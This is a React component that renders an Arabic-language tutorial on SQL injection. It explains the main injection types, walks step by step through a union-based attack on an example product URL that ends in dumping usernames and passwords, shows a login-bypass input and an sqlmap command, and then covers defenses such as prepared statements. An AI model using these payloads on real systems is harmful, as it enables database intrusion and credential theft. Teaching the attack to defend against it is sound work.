import React from 'react';

function SqlInjectionArticle() {
  return (
    <section className="container">
      <h1 className="page-title">🛡️ ثغرات SQL Injection: الشرح الكامل والاستغلال والحماية</h1>

      <div className="article-content">
        <p>
          <strong>ثغرة SQL Injection (حقن قواعد البيانات)</strong> هي واحدة من أخطر الثغرات الأمنية التي تصيب التطبيقات التي تعتمد على قواعد البيانات. تحدث عندما يتم إدخال أو "حقن" أوامر SQL ضارة داخل مدخلات المستخدم غير المؤمنة، مما يسمح للمهاجم بتنفيذ أوامر مباشرة على قاعدة البيانات.
        </p>
        <p><strong>مثال سريع:</strong></p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `SELECT * FROM users WHERE username = '$input';` }}></code>
          </pre>
        </div>
        <p>إذا كان الإدخال <code style={{ direction: 'ltr' }}>admin' --</code> فسيصبح:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `SELECT * FROM users WHERE username = 'admin' --';` }}></code>
          </pre>
        </div>
        <p>وسيتم تخطي التحقق من كلمة المرور!</p>

        <hr />

        <h2>🔍 أنواع SQL Injection</h2>
        <h3>1. Classic SQLi (In-band)</h3>
        <ul>
          <li><strong>Error-based:</strong> يعتمد على رسائل الخطأ من الخادم.</li>
          <li><strong>Union-based:</strong> يستخدم أمر <code style={{ direction: 'ltr' }}>UNION</code> لدمج نتائج استعلامات إضافية.</li>
        </ul>

        <h3>2. Blind SQLi</h3>
        <p>لا يتم عرض نتائج الاستعلام، ولكن يمكن استنتاجها عبر الاستجابات (نعم/لا).</p>
        <ul>
          <li><strong>Boolean-based:</strong> يعتمد على العبارات المنطقية.</li>
          <li><strong>Time-based:</strong> يستخدم تأخير زمني <code style={{ direction: 'ltr' }}>SLEEP()</code> لتحديد ما إذا كان الشرط صحيحًا.</li>
        </ul>

        <h3>3. Out-of-Band SQLi</h3>
        <p>تستخدم قنوات خارجية (مثل DNS أو HTTP) لإرسال النتائج إلى المهاجم. نادرة وتحدث عندما لا يمكن استخدام In-band أو Blind.</p>

        <hr />

        <h2>🎯 كيفية استغلال SQL Injection</h2>
        <h3>🧪 مثال تطبيقي (Union-based):</h3>
        <p>نفترض هذا الرابط:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `https://madar.com/product.php?id=5` }}></code>
          </pre>
        </div>
        <p>نجرب:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `?id=5' UNION SELECT null,null--` }}></code>
          </pre>
        </div>
        <p>ثم نزيد الأعمدة حتى لا تظهر أخطاء:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `?id=5' UNION SELECT 1,2,3--` }}></code>
          </pre>
        </div>
        <p>إذا ظهرت القيم في الصفحة، نعرف عدد الأعمدة والمواقع المعروضة.</p>
        <p>ثم نحاول كشف أسماء الجداول:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `?id=5' UNION SELECT table_name, null, null FROM information_schema.tables--` }}></code>
          </pre>
        </div>
        <p>ثم أعمدة الجدول:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `?id=5' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users'--` }}></code>
          </pre>
        </div>
        <p>ثم نطلب البيانات:</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `?id=5' UNION SELECT username, password, null FROM users--` }}></code>
          </pre>
        </div>

        <hr />

        <h2>🛠️ أدوات استغلال SQLi</h2>
        <ul>
          <li>✅ <strong>sqlmap:</strong> أشهر أداة تلقائية.</li>
          <div className="code-block">
            <pre>
              <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `sqlmap -u "http://madar.com/product.php?id=1" --dbs` }}></code>
            </pre>
          </div>
          <li>✅ <strong>Burp Suite</strong></li>
          <li>✅ <strong>Havij</strong> (غير مفتوح المصدر، خطير أمنيًا)</li>
        </ul>

        <hr />

        <h2>🛡️ كيف نحمي تطبيقاتنا من SQL Injection؟</h2>
        <h3>1. ✅ استخدام الاستعلامات المجهزة (Prepared Statements)</h3>
        <p>مثال بلغة PHP (PDO):</p>
        <div className="code-block">
          <pre>
            <code style={{ direction: 'ltr' }} dangerouslySetInnerHTML={{ __html: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");\n$stmt->execute(['username' => $input]);` }}></code>
          </pre>
        </div>
        <h3>2. ✅ التحقق من مدخلات المستخدم</h3>
        <ul>
          <li>السماح فقط بالقيم المتوقعة (رقم؟ بريد؟ كلمة؟).</li>
          <li>استخدام "whitelist" بدلًا من "blacklist".</li>
        </ul>
        <h3>3. ✅ الحد من صلاحيات قاعدة البيانات</h3>
        <p>لا تجعل التطبيق يتصل بقاعدة البيانات بصلاحية root أو admin.</p>
        <h3>4. ✅ إخفاء الأخطاء</h3>
        <p>لا تعرض رسائل الخطأ في الواجهة النهائية للمستخدم.</p>
        <h3>5. ✅ استخدام Web Application Firewall (WAF)</h3>
        <p>مثل ModSecurity أو AWS WAF لحماية التطبيقات من الحقن الشائع.</p>
        <h3>6. ✅ اختبار الأمان بشكل دوري</h3>
        <ul>
          <li>استخدم أدوات مثل sqlmap و Burp Suite.</li>
          <li>إجراء فحوصات أمان دورية (Penetration Testing).</li>
        </ul>

        <hr />

        <h2>⚠️ ملاحظات هامة</h2>
        <ul>
          <li>ثغرات SQLi قد تؤدي إلى تسريب بيانات حساسة أو حتى السيطرة الكاملة على الخادم.</li>
          <li>أغلب حوادث الاختراق الكبرى كانت بسبب SQL Injection.</li>
          <li>معالجة الثغرات في جانب الخادم ضروري؛ لا تعتمد فقط على JavaScript أو التحقق من جانب المستخدم.</li>
        </ul>

        <hr />

        <h2>📚 مصادر إضافية</h2>
        <ul>
          <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
          <li><a href="https://sqlmap.org" target="_blank">sqlmap official documentation</a></li>
        </ul>
      </div>
    </section>
  );
}

export default SqlInjectionArticle;